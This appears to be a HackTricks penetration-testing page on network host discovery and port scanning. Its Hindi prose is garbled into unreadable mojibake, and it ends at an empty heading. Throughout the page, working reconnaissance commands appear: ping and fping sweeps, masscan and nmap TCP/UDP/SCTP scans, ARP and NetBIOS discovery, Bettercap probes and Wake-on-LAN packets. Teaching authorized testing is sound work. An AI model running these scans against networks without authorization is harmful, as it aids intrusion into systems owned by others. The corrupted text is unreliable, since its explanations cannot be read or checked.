# Pentesting Network

<details>

<summary><strong>рдЬрд╛рдиреЗрдВ AWS рд╣реИрдХрд┐рдВрдЧ рдХреЛ рд╢реВрдиреНрдп рд╕реЗ рд╣реАрд░реЛ рддрдХ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a> <strong>рдХреЗ рд╕рд╛рде!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдпрджрд┐ рдЖрдк рдЕрдкрдиреА **рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди HackTricks рдореЗрдВ рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рддреЛ [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рдиреНрд╕ рджреЗрдЦреЗрдВ**](https://github.com/sponsors/carlospolop)!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS рдФрд░ HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* рд╣рдорд╛рд░реЗ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family) рдХрд▓реЗрдХреНрд╢рди, [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдЦреЛрдЬреЗрдВ
* **рдЬреБрдбрд╝реЗрдВ** ЁЯТм [**рдбрд┐рд╕реНрдХреЙрд░реНрдб рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдореЗрдВ рдпрд╛ рд╣рдореЗрдВ **рдЯреНрд╡рд┐рдЯрд░** ЁЯРж [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)\*\* рдкрд░ рдлреЙрд▓реЛ\*\* рдХрд░реЗрдВред
* **рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ рдФрд░ PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗ** [**HackTricks**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos рдореЗрдВред

</details>

<img src="../../.gitbook/assets/i3.png" alt="" data-size="original">\
**рдмрдЧ рдмрд╛рдЙрдВрдЯреА рдЯрд┐рдк**: **Intigriti** рдХреЗ рд▓рд┐рдП **рд╕рд╛рдЗрди рдЕрдк рдХрд░реЗрдВ**, рдПрдХ рдкреНрд░реАрдорд┐рдпрдо **рдмрдЧ рдмрд╛рдЙрдВрдЯреА рдкреНрд▓реЗрдЯрдлреЙрд░реНрдо рдЬреЛ рд╣реИрдХрд░реНрд╕ рджреНрд╡рд╛рд░рд╛ рдмрдирд╛рдпрд╛ рдЧрдпрд╛ рд╣реИ**! рдЖрдЬ рд╣реА рд╣рдорд╛рд░реЗ рд╕рд╛рде рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) рдФрд░ рд╢реБрд░реВ рдХрд░реЗрдВ рдмрд╛рдЙрдВрдЯреА рдЕрдк рддрдХ **$100,000** рддрдХ рдХрдорд╛рдирд╛!

{% embed url="https://go.intigriti.com/hacktricks" %}

## рдмрд╛рд╣рд░ рд╕реЗ рд╣реЛрд╕реНрдЯ рдХреА рдЦреЛрдЬ

рдпрд╣ рдПрдХ **рд╕рдВрдХреНрд╖рд┐рдкреНрдд рдЦрдВрдб** рд╣реЛрдЧрд╛ рдЬрд┐рд╕рдореЗрдВ рдмрддрд╛рдпрд╛ рдЬрд╛рдПрдЧрд╛ рдХрд┐ рдЗрдВрдЯрд░рдиреЗрдЯ рд╕реЗ **рдХрд┐рд╕реА рднреА рд╣реЛрд╕реНрдЯ рдХреЛ рдЦреЛрдЬрдиреЗ** рдХрд╛ рддрд░реАрдХрд╛ред\
рдЗрд╕ рд╕реНрдерд┐рддрд┐ рдореЗрдВ рдЖрдкрдХреЗ рдкрд╛рд╕ рдХреБрдЫ **рдЖрдИрдкреА рд╕реНрдХреЛрдк** рд╣реЛрддрд╛ рд╣реИ (рд╢рд╛рдпрдж рдХрдИ **рд░реЗрдВрдЬ** рднреА) рдФрд░ рдЖрдкрдХреЛ **рдХреМрди рд╕реЗ рдЖрдИрдкреА рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рджреЗ рд░рд╣реЗ рд╣реИрдВ** рдпрд╣ рдкрддрд╛ рдХрд░рдирд╛ рд╣реИред

### ICMP

рдпрд╣ рд╣реЛрд╕реНрдЯ рдЙрдк рд╣реИ рдпрд╛ рдирд╣реАрдВ, рдпрд╣ рдЬрд╛рдирдиреЗ рдХрд╛ **рд╕рдмрд╕реЗ рдЖрд╕рд╛рди** рдФрд░ **рддреЗрдЬрд╝ рддрд░реАрдХрд╛** рд╣реИред\
рдЖрдк рдХреБрдЫ **ICMP** рдкреИрдХреЗрдЯ рднреЗрдЬрдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ **рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдХреА рдЙрдореНрдореАрдж** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рд╕рдмрд╕реЗ рдЖрд╕рд╛рди рддрд░реАрдХрд╛ рдПрдХ **рдЗрдХреЛ рдЕрдиреБрд░реЛрдз** рднреЗрдЬрдирд╛ рд╣реИ рдФрд░ рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдХреА рдЙрдореНрдореАрдж рдХрд░рдирд╛ рд╣реИред рдЖрдк рдЗрд╕реЗ рдПрдХ рд╕рд╛рдзрд╛рд░рдг `ping` рдпрд╛ **рд░реЗрдВрдЬ** рдХреЗ рд▓рд┐рдП `fping` рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред\
рдЖрдк **nmap** рднреА рдЗрд╕реНрддреЗрдорд╛рд▓ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдЕрдиреНрдп рдкреНрд░рдХрд╛рд░ рдХреЗ ICMP рдкреИрдХреЗрдЯ рднреЗрдЬрдиреЗ рдХреЗ рд▓рд┐рдП (рдпрд╣ рд╕рд╛рдорд╛рдиреНрдп ICMP рдЗрдХреЛ рдЕрдиреБрд░реЛрдз-рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдХреЛ рдлрд╝рд┐рд▓реНрдЯрд░ рдХрд░реЗрдЧрд╛)ред

```bash
ping -c 1 199.66.11.4    # 1 echo request to a host
fping -g 199.66.11.0/24  # Send echo requests to ranges
nmap -PE -PM -PP -sn -n 199.66.11.0/24 #Send echo, timestamp requests and subnet mask requests
```

### TCP рдкреЛрд░реНрдЯ рдЦреЛрдЬ

рдмрд╣реБрдд рд╕рд╛рдорд╛рдиреНрдп рд╣реИ рдХрд┐ рд╕рднреА рдкреНрд░рдХрд╛рд░ рдХреЗ ICMP рдкреИрдХреЗрдЯреНрд╕ рдХреЛ рдлрд╝рд┐рд▓реНрдЯрд░ рдХрд┐рдпрд╛ рдЬрд╛ рд░рд╣рд╛ рд╣реИред рдЗрд╕рдХреЗ рдмрд╛рдж, рдЖрдкрдХреЗ рдкрд╛рд╕ рдХреЗрд╡рд▓ **рдЦреБрд▓реЗ рдкреЛрд░реНрдЯреНрд╕ рдвреВрдВрдврдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░рдирд╛** рд╣реИред рдкреНрд░рддреНрдпреЗрдХ рд╣реЛрд╕реНрдЯ рдореЗрдВ **65535 рдкреЛрд░реНрдЯреНрд╕** рд╣реЛрддреЗ рд╣реИрдВ, рдЗрд╕рд▓рд┐рдП, рдЕрдЧрд░ рдЖрдкрдХреЗ рдкрд╛рд╕ "рдмрдбрд╝реА" рд╕реНрдХреЛрдк рд╣реИ рддреЛ рдЖрдк **рд╣рд░ рд╣реЛрд╕реНрдЯ рдХреЗ рд╣рд░ рдкреЛрд░реНрдЯ** рдХрд╛ рдЬрд╛рдВрдЪ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕рдордп рдирд╣реАрдВ рд▓реЗ рд╕рдХрддреЗ, рдпрд╣ рдмрд╣реБрдд рдЕрдзрд┐рдХ рд╕рдордп рд▓реЗрдЧрд╛ред\
рдЗрд╕рд▓рд┐рдП, рдЖрдкрдХреЛ рдПрдХ **рддреЗрдЬ рдкреЛрд░реНрдЯ рд╕реНрдХреИрдирд░** ([masscan](https://github.com/robertdavidgraham/masscan)) рдФрд░ **рдЕрдзрд┐рдХ рдкреНрд░рдпреЛрдЧ рдХрд┐рдП рдЬрд╛рдиреЗ рд╡рд╛рд▓реЗ рдкреЛрд░реНрдЯреНрд╕** рдХреА рд╕реВрдЪреА рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИ:

```bash
#Using masscan to scan top20ports of nmap in a /24 range (less than 5min)
masscan -p20,21-23,25,53,80,110,111,135,139,143,443,445,993,995,1723,3306,3389,5900,8080 199.66.11.0/24
```

### HTTP рдкреЛрд░реНрдЯ рдЦреЛрдЬ

рдпрд╣ рдПрдХ TCP рдкреЛрд░реНрдЯ рдЦреЛрдЬ рд╣реИ рдЬреЛ рдЬрдм рдЖрдк **HTTP рд╕реЗрд╡рд╛рдУрдВ рдХреА рдЦреЛрдЬ рдкрд░ рдзреНрдпрд╛рди рдХреЗрдВрджреНрд░рд┐рдд рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ**ред

```bash
masscan -p80,443,8000-8100,8443 199.66.11.0/24
```

### UDP рдкреЛрд░реНрдЯ рдЦреЛрдЬ

рдЖрдк рдпрд╣ рднреА рдЬрд╛рдВрдЪ рд╕рдХрддреЗ рд╣реИрдВ рдХрд┐ рдХреНрдпрд╛ рдХреЛрдИ **UDP рдкреЛрд░реНрдЯ рдЦреБрд▓рд╛** рд╣реИ рддрд╛рдХрд┐ рдЖрдк рдПрдХ **рд╣реЛрд╕реНрдЯ** рдкрд░ **рдЕрдзрд┐рдХ рдзреНрдпрд╛рди** рджреЗрдиреЗ рдХрд╛ рдирд┐рд░реНрдгрдп рд▓реЗ рд╕рдХреЗрдВред UDP рд╕реЗрд╡рд╛рдПрдВ рдЖрдо рддреМрд░ рдкрд░ **рдХрд┐рд╕реА рдбреЗрдЯрд╛** рдХреЗ рд╕рд╛рде **рдХрд┐рд╕реА рдирд┐рдпрдорд┐рдд рдЦрд╛рд▓реА UDP рдкреНрд░реЛрдм рдкреИрдХреЗрдЯ** рдХрд╛ рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдирд╣реАрдВ рдХрд░рддреА рд╣реИрдВ, рдЗрд╕рд▓рд┐рдП рдпрд╣ рдХрдард┐рди рд╣реИ рдХрд┐ рдХреНрдпрд╛ рдкреЛрд░реНрдЯ рдлрд╝рд┐рд▓реНрдЯрд░ рдХрд┐рдпрд╛ рдЬрд╛ рд░рд╣рд╛ рд╣реИ рдпрд╛ рдЦреБрд▓рд╛ рд╣реИред рдЗрд╕реЗ рдирд┐рд░реНрдзрд╛рд░рд┐рдд рдХрд░рдиреЗ рдХрд╛ рд╕рдмрд╕реЗ рд╕рд░рд▓ рддрд░реАрдХрд╛ рдпрд╣ рд╣реИ рдХрд┐ рдЪрд▓ рд░рд╣реА рд╕реЗрд╡рд╛ рд╕реЗ рд╕рдВрдмрдВрдзрд┐рдд рдПрдХ рдкреИрдХреЗрдЯ рднреЗрдЬреЗрдВ, рдФрд░ рдЬреИрд╕рд╛ рдХрд┐ рдЖрдкрдХреЛ рдирд╣реАрдВ рдкрддрд╛ рдХрд┐ рдХреМрди рд╕реА рд╕реЗрд╡рд╛ рдЪрд▓ рд░рд╣реА рд╣реИ, рдЖрдкрдХреЛ рдкреЛрд░реНрдЯ рдирдВрдмрд░ рдХреЗ рдЖрдзрд╛рд░ рдкрд░ рд╕рдмрд╕реЗ рд╕рдВрднрд╛рд╡рд┐рдд рдХреЛрд╢рд┐рд╢ рдХрд░рдиреА рдЪрд╛рд╣рд┐рдП:

```bash
nmap -sU -sV --version-intensity 0 -F -n 199.66.11.53/24
# The -sV will make nmap test each possible known UDP service packet
# The "--version-intensity 0" will make nmap only test the most probable
```

рдиреАрдЪреЗ рдкреНрд░рд╕реНрддрд╛рд╡рд┐рдд nmap рд▓рд╛рдЗрди рд╣рд░ рд╣реЛрд╕реНрдЯ рдореЗрдВ **/24** рд░реЗрдВрдЬ рдХреЗ **рд╢реАрд░реНрд╖ 1000 UDP рдкреЛрд░реНрдЯ** рдХрд╛ рдкрд░реАрдХреНрд╖рдг рдХрд░реЗрдЧреА, рд▓реЗрдХрд┐рди рдпрд╣ рднреА рдХреЗрд╡рд▓ рдЗрд╕рдХреЗ рд▓рд┐рдП **>20 рдорд┐рдирдЯ** рд▓реЗрдЧрд╛ред рдпрджрд┐ **рддреЗрдЬрд╝ рдирддреАрдЬреЗ** рдЪрд╛рд╣рд┐рдП рддреЛ рдЖрдк [**udp-proto-scanner**](https://github.com/portcullislabs/udp-proto-scanner) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ: `./udp-proto-scanner.pl 199.66.11.53/24` рдпрд╣ рдЗрди **UDP рдкреНрд░реЛрдмреНрд╕** рдХреЛ рдЙрдирдХреЗ **рдЕрдкреЗрдХреНрд╖рд┐рдд рдкреЛрд░реНрдЯ** рдкрд░ рднреЗрдЬреЗрдЧрд╛ (рдПрдХ /24 рд░реЗрдВрдЬ рдХреЗ рд▓рд┐рдП рдпрд╣ рд╕рд┐рд░реНрдл 1 рдорд┐рдирдЯ рд▓реЗрдЧрд╛): _DNSStatusRequest, DNSVersionBindReq, NBTStat, NTPRequest, RPCCheck, SNMPv3GetRequest, chargen, citrix, daytime, db2, echo, gtpv1, ike,ms-sql, ms-sql-slam, netop, ntp, rpc, snmp-public, systat, tftp, time, xdmcp._

### SCTP рдкреЛрд░реНрдЯ рдЦреЛрдЬ

```bash
#Probably useless, but it's pretty fast, why not trying?
nmap -T4 -sY -n --open -Pn <IP/range>
```

## WiFi рдкреЗрдВрдЯреЗрд╕реНрдЯрд┐рдВрдЧ

рдпрд╣рд╛рдБ рдЖрдкрдХреЛ рд▓реЗрдЦрди рдХреЗ рд╕рдордп рд╕рднреА рдкреНрд░рд╕рд┐рджреНрдз WiFi рд╣рдорд▓реЛрдВ рдХрд╛ рдПрдХ рдЕрдЪреНрдЫрд╛ рдорд╛рд░реНрдЧрджрд░реНрд╢рди рдорд┐рд▓реЗрдЧрд╛:

{% content-ref url="../pentesting-wifi/" %}
[pentesting-wifi](../pentesting-wifi/)
{% endcontent-ref %}

## рдЕрдВрджрд░ рд╕реЗ рд╣реЛрд╕реНрдЯ рдХреА рдЦреЛрдЬ

рдЕрдЧрд░ рдЖрдк рдиреЗрдЯрд╡рд░реНрдХ рдХреЗ рдЕрдВрджрд░ рд╣реИрдВ рддреЛ рдЖрдкрдХреЛ рдкрд╣рд▓реА рдмрд╛рд░ рдХрд░рдирд╛ рдЪрд╛рд╣рд┐рдП **рдЕрдиреНрдп рд╣реЛрд╕реНрдЯ рдХреА рдЦреЛрдЬ**. рдЖрдкрдХреЗ рдкрд╛рд╕ рдХрд┐рддрдиреА **рд╢реЛрд░** рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИ, рдЗрд╕ рдкрд░ рдирд┐рд░реНрднрд░ рдХрд░рддрд╛ рд╣реИ, рд╡рд┐рднрд┐рдиреНрди рдХреНрд░рд┐рдпрд╛рдПрдБ рдХреА рдЬрд╛ рд╕рдХрддреА рд╣реИрдВ:

### рдирд┐рд╖реНрдХреНрд░рд┐рдп

рдЖрдк рдЗрди рдЙрдкрдХрд░рдгреЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЬреБрдбрд╝реЗ рдиреЗрдЯрд╡рд░реНрдХ рдХреЗ рдЕрдВрджрд░ рд╣реЛрд╕реНрдЯ рдХреА рдЦреЛрдЬ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:

```bash
netdiscover -p
p0f -i eth0 -p -o /tmp/p0f.log
# Bettercap
net.recon on/off #Read local ARP cache periodically
net.show
set net.show.meta true #more info
```

### рд╕рдХреНрд░рд┐рдп

рдиреЛрдЯ рдХрд░реЗрдВ рдХрд┐ рддрдХрдиреАрдХреЗрдВ рдЬреЛ [_**рдмрд╛рд╣рд░ рд╕реЗ рд╣реЛрд╕реНрдЯ рдХреА рдЦреЛрдЬ**_](./#discovering-hosts-from-the-outside) (_TCP/HTTP/UDP/SCTP рдкреЛрд░реНрдЯ рдЦреЛрдЬ_) рдореЗрдВ рдЯрд┐рдкреНрдкрдгреА рдХреА рдЧрдИ рд╣реИрдВ, рд╡реЗ рдпрд╣рд╛рдБ рднреА **рд▓рд╛рдЧреВ рдХреА рдЬрд╛ рд╕рдХрддреА рд╣реИрдВ**ред\
рд▓реЗрдХрд┐рди, рдЬреИрд╕рд╛ рдХрд┐ рдЖрдк рджреВрд╕рд░реЗ рд╣реЛрд╕реНрдЯ рдХреЗ **рд╕рдорд╛рди рдиреЗрдЯрд╡рд░реНрдХ** рдореЗрдВ рд╣реИрдВ, рдЖрдк **рдЕрдзрд┐рдХ рдЪреАрдЬреЗрдВ** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:

```bash
#ARP discovery
nmap -sn <Network> #ARP Requests (Discover IPs)
netdiscover -r <Network> #ARP requests (Discover IPs)

#NBT discovery
nbtscan -r 192.168.0.1/24 #Search in Domain

# Bettercap
net.probe on/off #Discover hosts on current subnet by probing with ARP, mDNS, NBNS, UPNP, and/or WSD
set net.probe.mdns true/false #Enable mDNS discovery probes (default=true)
set net.probe.nbns true/false #Enable NetBIOS name service discovery probes (default=true)
set net.probe.upnp true/false #Enable UPNP discovery probes (default=true)
set net.probe.wsd true/false #Enable WSD discovery probes (default=true)
set net.probe.throttle 10 #10ms between probes sent (default=10)

#IPv6
alive6 <IFACE> # Send a pingv6 to multicast.
```

### рд╕рдХреНрд░рд┐рдп ICMP

рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ _рдмрд╛рд╣рд░ рд╕реЗ рд╣реЛрд╕реНрдЯ рдХреА рдЦреЛрдЬ_ рдореЗрдВ рдЯрд┐рдкреНрдкрдгреАрдд рддрдХрдиреАрдХреЗрдВ ([_**ICMP**_](./#icmp)) рдпрд╣рд╛рдБ рднреА **рд▓рд╛рдЧреВ рдХреА рдЬрд╛ рд╕рдХрддреА рд╣реИрдВ**ред\
рд▓реЗрдХрд┐рди, рдЖрдк **рджреВрд╕рд░реЗ рд╣реЛрд╕реНрдЯреНрд╕** рдХреЗ рд╕рд╛рде **рдПрдХ рд╣реА рдиреЗрдЯрд╡рд░реНрдХ** рдореЗрдВ рд╣реИрдВ, рддреЛ рдЖрдк **рдЕрдзрд┐рдХ рдЪреАрдЬреЗрдВ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ**:

* рдпрджрд┐ рдЖрдк **рдПрдХ рд╕рдмрдиреЗрдЯ рдмреНрд░реЙрдбрдХрд╛рд╕реНрдЯ рдкрддреЗ** рдкрд░ **рдкрд┐рдВрдЧ** рдХрд░рддреЗ рд╣реИрдВ рддреЛ рдкрд┐рдВрдЧ **рдкреНрд░рддреНрдпреЗрдХ рд╣реЛрд╕реНрдЯ** рддрдХ рдкрд╣реБрдВрдЪрдирд╛ рдЪрд╛рд╣рд┐рдП рдФрд░ рд╡реЗ **рдЖрдкрдХреЛ рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛** рджреЗ рд╕рдХрддреЗ рд╣реИрдВ: `ping -b 10.10.5.255`
* рдиреЗрдЯрд╡рд░реНрдХ рдмреНрд░реЙрдбрдХрд╛рд╕реНрдЯ рдкрддреЗ рдкрд░ рдкрд┐рдВрдЧ рдХрд░рдХреЗ рдЖрдк **рдЕрдиреНрдп рд╕рдмрдиреЗрдЯреНрд╕** рдореЗрдВ рд╣реЛрд╕реНрдЯреНрд╕ рднреА рдЦреЛрдЬ рд╕рдХрддреЗ рд╣реИрдВ: `ping -b 255.255.255.255`
* `nmap` рдХреЗ `-PE`, `-PP`, `-PM` рдлреНрд▓реИрдЧреНрд╕ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рд╣реЛрд╕реНрдЯ рдЦреЛрдЬ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП **ICMPv4 рдЗрдХреЛ**, **рдЯрд╛рдЗрдорд╕реНрдЯреИрдореНрдк**, рдФрд░ **рд╕рдмрдиреЗрдЯ рдорд╛рд╕реНрдХ рдЕрдиреБрд░реЛрдз** рднреЗрдЬрдиреЗ рдХреЗ рд▓рд┐рдП: `nmap -PE -PM -PP -sn -vvv -n 10.12.5.0/24`

### **рд╡реЗрдХ рдСрди рд▓реИрди**

рд╡реЗрдХ рдСрди рд▓реИрди рдХрд╛ рдЙрдкрдпреЛрдЧ **рдиреЗрдЯрд╡рд░реНрдХ рд╕рдВрджреЗрд╢** рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдХрдВрдкреНрдпреВрдЯрд░реНрд╕ рдХреЛ **рдЪрд╛рд▓реВ** рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред рдХрдВрдкреНрдпреВрдЯрд░ рдХреЛ рдЪрд╛рд▓реВ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рдиреЗ рд╡рд╛рд▓рд╛ рдЬрд╛рджреВ рдХрд╛ рдкреИрдХреЗрдЯ рдХреЗрд╡рд▓ рдПрдХ рдкреИрдХреЗрдЯ рд╣реИ рдЬрд┐рд╕рдореЗрдВ рдПрдХ **MAC Dst** рдкреНрд░рджрд╛рди рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рдФрд░ рдлрд┐рд░ рдпрд╣ **16 рдмрд╛рд░ рджреЛрд╣рд░рд╛рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ**ред\
рдлрд┐рд░ рдЗрд╕ рдкреНрд░рдХрд╛рд░ рдХреЗ рдкреИрдХреЗрдЯреНрд╕ рдЖрдо рддреМрд░ рдкрд░ рдПрдХ **рдЗрдерд░рдиреЗрдЯ 0x0842** рдпрд╛ **рдкреЛрд░реНрдЯ 9 рдкрд░ рдпреВрдбреАрдкреА рдкреИрдХреЗрдЯ** рдореЗрдВ рднреЗрдЬреЗ рдЬрд╛рддреЗ рд╣реИрдВред\
рдпрджрд┐ **рдХреЛрдИ \[MAC]** рдкреНрд░рджрд╛рди рдирд╣реАрдВ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ, рддреЛ рдкреИрдХреЗрдЯ **рдмреНрд░реЙрдбрдХрд╛рд╕реНрдЯ рдЗрдерд░рдиреЗрдЯ** рдкрд░ рднреЗрдЬрд╛ рдЬрд╛рддрд╛ рд╣реИ (рдФрд░ рджреЛрд╣рд░рд╛рдпрд╛ рдЬрд╛рдиреЗ рд╡рд╛рд▓рд╛ рдореИрдХ рдЙрд╕реА рд╣реЛрдЧрд╛)ред

```bash
# Bettercap (if no [MAC] is specificed ff:ff:ff:ff:ff:ff will be used/entire broadcast domain)
wol.eth [MAC] #Send a WOL as a raw ethernet packet of type 0x0847
wol.udp [MAC] #Send a WOL as an IPv4 broadcast packet to UDP port 9
```

## рд╣реЛрд╕реНрдЯ рд╕реНрдХреИрди рдХрд░рдирд╛

рдЬрдм рдЖрдкрдиреЗ рд╕рднреА рдЖрдИрдкреА (рдмрд╛рд╣рд░реА рдпрд╛ рдЖрдВрддрд░рд┐рдХ) рдХрд╛ рдкрддрд╛ рд▓рдЧрд╛рдпрд╛ рд╣реИ рдЬрд┐рдиреНрд╣реЗрдВ рдЖрдк рдЧрд╣рд░рд╛рдИ рд╕реЗ рд╕реНрдХреИрди рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ, рддреЛ рд╡рд┐рднрд┐рдиреНрди рдХреНрд░рд┐рдпрд╛рдПрдБ рдХреА рдЬрд╛ рд╕рдХрддреА рд╣реИрдВред

### TCP

* **рдЦреБрд▓рд╛** рдкреЛрд░реНрдЯ: _SYN --> SYN/ACK --> RST_
* **рдмрдВрдж** рдкреЛрд░реНрдЯ: _SYN --> RST/ACK_
* **рдлрд╝рд┐рд▓реНрдЯрд░** рдХрд┐рдпрд╛ рдЧрдпрд╛ рдкреЛрд░реНрдЯ: _SYN --> \[рдХреЛрдИ рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдирд╣реАрдВ]_
* **рдлрд╝рд┐рд▓реНрдЯрд░** рдХрд┐рдпрд╛ рдЧрдпрд╛ рдкреЛрд░реНрдЯ: _SYN --> ICMP рд╕рдВрджреЗрд╢_

```bash
# Nmap fast scan for the most 1000tcp ports used
nmap -sV -sC -O -T4 -n -Pn -oA fastscan <IP>
# Nmap fast scan for all the ports
nmap -sV -sC -O -T4 -n -Pn -p- -oA fullfastscan <IP>
# Nmap fast scan for all the ports slower to avoid failures due to -T4
nmap -sV -sC -O -p- -n -Pn -oA fullscan <IP>

#Bettercap Scan
syn.scan 192.168.1.0/24 1 10000 #Ports 1-10000
```

### UDP

UDP рдкреЛрд░реНрдЯ рд╕реНрдХреИрди рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП 2 рд╡рд┐рдХрд▓реНрдк рд╣реИрдВ:

* **UDP рдкреИрдХреЗрдЯ** рднреЗрдЬреЗрдВ рдФрд░ рдЬрд╛рдВрдЪреЗрдВ рдХрд┐ рдХреНрдпрд╛ рдкреЛрд░реНрдЯ **рдмрдВрдж** рд╣реИ рдЕрдЧрд░ **ICMP unreachable** рдХрд╛ рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдорд┐рд▓рддрд╛ рд╣реИ (рдХрдИ рдорд╛рдорд▓реЛрдВ рдореЗрдВ ICMP **рдлрд╝рд┐рд▓реНрдЯрд░** рд╣реЛрдЧрд╛, рдЗрд╕рд▓рд┐рдП рдпрджрд┐ рдкреЛрд░реНрдЯ рдмрдВрдж рдпрд╛ рдЦреБрд▓рд╛ рд╣реИ рддреЛ рдЖрдкрдХреЛ рдХреЛрдИ рдЬрд╛рдирдХрд╛рд░реА рдкреНрд░рд╛рдкреНрдд рдирд╣реАрдВ рд╣реЛрдЧреА)ред
* **рдлреЙрд░реНрдореЗрдЯреЗрдб рдбреЗрдЯрд╛рдЧреНрд░рд╛рдо** рднреЗрдЬреЗрдВ рддрд╛рдХрд┐ рдПрдХ **рд╕реЗрд╡рд╛** рд╕реЗ рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдкреНрд░рд╛рдкреНрдд рд╣реЛ (рдЬреИрд╕реЗ, DNS, DHCP, TFTP, рдФрд░ рдЕрдиреНрдп, рдЬреИрд╕реЗ рдХрд┐ _nmap-payloads_ рдореЗрдВ рд╕реВрдЪреАрдмрджреНрдз рд╣реИ)ред рдпрджрд┐ рдЖрдкрдХреЛ **рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛** рдорд┐рд▓рддреА рд╣реИ, рддреЛ рдкреЛрд░реНрдЯ **рдЦреБрд▓рд╛** рд╣реИред

**Nmap** "-sV" рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ **рджреЛрдиреЛрдВ** рд╡рд┐рдХрд▓реНрдкреЛрдВ рдХрд╛ рдорд┐рд╢реНрд░рдг рдХрд░реЗрдЧрд╛ (UDP рд╕реНрдХреИрди рдмрд╣реБрдд рдзреАрдорд╛ рд╣реЛрддрд╛ рд╣реИ), рд▓реЗрдХрд┐рди рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ UDP рд╕реНрдХреИрди TCP рд╕реНрдХреИрди рд╕реЗ рдзреАрдорд╛ рд╣реЛрддрд╛ рд╣реИ:

```bash
# Check if any of the most common udp services is running
udp-proto-scanner.pl <IP>
# Nmap fast check if any of the 100 most common UDP services is running
nmap -sU -sV --version-intensity 0 -n -F -T4 <IP>
# Nmap check if any of the 100 most common UDP services is running and launch defaults scripts
nmap -sU -sV -sC -n -F -T4 <IP>
# Nmap "fast" top 1000 UDP ports
nmap -sU -sV --version-intensity 0 -n -T4 <IP>
# You could use nmap to test all the UDP ports, but that will take a lot of time
```

### SCTP рд╕реНрдХреИрди

